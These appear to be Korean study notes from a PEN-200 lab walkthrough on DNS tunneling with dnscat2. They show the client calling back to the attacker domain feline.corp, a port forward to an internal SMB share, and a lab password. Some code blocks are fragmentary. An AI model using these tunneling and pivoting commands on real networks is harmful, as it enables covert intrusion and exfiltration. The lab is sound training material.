# 20.2.2 dnscat2 DNS 터널링

> **DNS Tunneling with dnscat2** · PEN-200 §20.2.2

dnscat2 는 DNS 서브도메인 질의로 데이터를 내보내고(exfiltration) TXT·CNAME·MX 레코드 응답으로 데이터를 들여옴(infiltration). 구성의 전제는 **도메인 위임**임 — 서버는 특정 도메인의 authoritative name server 에서 돌고, 클라이언트는 그 도메인으로 질의하도록 설정돼 침해 호스트에서 돎. 대상이 공격자와 직접 통신하지 못해도, 대상이 쓰는 내부 해석기가 그 도메인을 재귀 질의로 authoritative 서버까지 밀어주므로 회선이 성립함.

실습 구성 — 공격자 측 FELINEAUTHORITY 가 `feline.corp` 의 authoritative 서버이고, 대상 PGDATABASE01 의 질의는 MULTISERVER03 을 거쳐 그리로 도달함. 먼저 udp/53 만 걸러 tcpdump 로 회선을 관찰함.

```
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
[sudo] password for kali:
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

*udp/53 만 캡처해 터널 트래픽을 관찰*

기존 Dnsmasq 프로세스는 C+c 로 종료하고, 도메인 하나만 인자로 줘 dnscat2 서버를 띄움.

*dnscat2 서버 기동 — 0.0.0.0:53 에서 대기, 클라이언트 실행 예시를 함께 출력*

클라이언트는 대상에서 같은 도메인만 인자로 줘 실행함. 실습에서는 바이너리가 이미 올라가 있으나, 실제로는 SSH·SCP 등 이미 확보한 통로로 옮겨야 함.

```
database_admin@pgdatabase01:~$ cd dnscat/
database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
Creating DNS driver:
 domain = feline.corp

displays this string:
Annoy Mona Spiced Outran Stump Visas

```

*대상에서 dnscat2 클라이언트 실행 — 세션 수립과 인증 문자열 출력*

⚠️ **닭이 먼저냐 달걀이 먼저냐 문제에 주의할 것.** 「명령 실행이 없는데 터널링 클라이언트를 어떻게 올리는가」는 순환이 아님 — 유출 기법은 **데이터를 나르는 수단일 뿐**이고, 대상 네트워크 접근을 여는 익스플로잇 벡터와 **짝지어 쓰는 것**임.

*dnscat2 서버에 잡힌 클라이언트 연결*

`--secret` 을 양쪽에 미리 지정하지 않으면 dnscat2 가 인증 문자열을 출력함(위 예에서 `Annoy Mona Spiced Outran Stump Visas`). 암호화 협상 뒤 **연결 무결성을 확인하는 용도**이며 클라이언트와 서버가 같은 문자열을 보이면 중간 변조가 없다는 뜻임. 값은 연결마다 바뀜.

*`feline.corp` 로 쏟아지는 DNS 질의*

캡처를 보면 CNAME·TXT·MX 질의와 응답이 초당 여러 건씩 오감 — **DNS 터널링은 은밀하지 않음.** 다만 요청·응답 페이로드가 전부 암호화돼 있어 계속 로깅해도 얻을 것이 없음.

세션 조작은 서버 쪽에서 함. `windows` 로 활성 창을 나열하고 `window -i <번호>` 로 명령 세션에 붙은 뒤 `?` 로 사용 가능한 명령을 확인함(각 명령은 `-h`/`--help` 로 상세 확인).

```
dnscat2> windows

*`windows` 로 세션 확인 후 `window -i 1` 로 명령 세션 진입*

이 모듈의 관심사는 터널링이므로 포트 포워딩 명령인 `listen` 을 봄. 콘솔 세션은 C+z 로 백그라운드에 보내고 명령 세션으로 돌아감.

```
command (pgdatabase01) 1> listen --help
Error: The user requested help
Listens on a local port and sends the connection out the other side (like ssh
    -L). Usage: listen [<lhost>:]<lport> <rhost>:<rport>
  --help, -h:   Show this message
```

*`listen` 사용법 — `ssh -L` 과 같은 로컬 포워드*

동작은 `ssh -L` 과 동일함 — 서버 쪽 로컬 포트에서 받은 TCP 를 DNS 터널로 밀어 넣고, 반대편에서 풀어 지정한 소켓으로 보냄. FELINEAUTHORITY 루프백 4455 에서 받아 HRSHARES 의 445 로 넘기도록 설정함.

```
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445
Listening on 127.0.0.1:4455, sending connections to 172.16.2.11:445
command (pgdatabase01) 1>
```

*로컬 4455 → 172.16.2.11:445 포워드 설정*

FELINEAUTHORITY 의 다른 셸에서 이 포워드를 통해 SMB 공유를 열거함.

```

password=Welcome1234

        IPC$            IPC       Remote IPC

*포워드를 거쳐 HRSHARES 의 SMB 공유 열거*

직접 연결보다 느린 것이 정상임 — TCP 기반 SMB 패킷이 UDP DNS 질의·응답에 캡슐화돼 왕복하기 때문. 결과적으로 HRSHARES 도 PGDATABASE01 도 FELINEAUTHORITY 와 직접 연결이 없는데 내부 깊숙한 호스트의 공유를 열거함.
